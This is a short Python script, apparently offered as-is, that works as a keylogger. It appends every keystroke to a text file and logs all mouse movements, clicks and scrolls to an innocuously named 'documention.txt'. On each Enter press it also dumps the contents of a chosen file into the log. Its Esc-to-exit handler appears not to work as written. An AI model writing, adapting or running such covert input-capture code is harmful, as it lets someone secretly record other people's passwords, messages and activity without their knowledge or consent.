import logging
import threading
import tkinter as tk
from tkinter import filedialog
from pynput import keyboard, mouse

# Initialize logging
logging.basicConfig(filename='documention.txt', level=logging.INFO)

# Keyboard listener callback function
def on_key_press(key):
    try:
        char = key.char
    except AttributeError:
        if key == keyboard.Key.space:
            char = " "
        elif key == keyboard.Key.enter:
            char = "\n"
            with open(selected_file, 'r') as selected_file_content:
                content = selected_file_content.read()
                logging.info("Selected file content:\n{}".format(content))
        else:
            char = str(key)
    with open("logfile.txt", 'a') as logkey:
        logkey.write(char)

# Mouse listener callback functions
def on_mouse_move(x, y):
    logging.info("Mouse moved to {} {}".format(x, y))

def on_mouse_click(x, y, button, pressed):
    action = "Pressed" if pressed else "Released"
    logging.info("Mouse {} at {} {}".format(action, x, y))

def on_mouse_scroll(x, y, dx, dy):
    logging.info("Mouse scrolled at {} {}: {} {}".format(x, y, dx, dy))

def exit_program():
    print("Exiting program...")
    exit_event.set()

def select_file():
    global selected_file
    selected_file = filedialog.askopenfilename()

if __name__ == "__main__":
    exit_event = threading.Event()

    # Create a simple GUI for selecting files
    root = tk.Tk()
    root.withdraw()  # Hide the main window

    # Prompt user to select a file
    select_file()

    # Start keyboard listener
    keyboard_listener = keyboard.Listener(on_press=on_key_press)
    keyboard_listener.start()

    # Start mouse listener
    mouse_listener = mouse.Listener(
        on_move=on_mouse_move,
        on_click=on_mouse_click,
        on_scroll=on_mouse_scroll
    )
    mouse_listener.start()

    # Register the Esc key to exit the program
    with keyboard.Listener(on_press=lambda key: exit_program() if key == keyboard.Key.esc else None) as esc_listener:
        esc_listener.join()

    # Wait for the program to exit
    exit_event.wait()


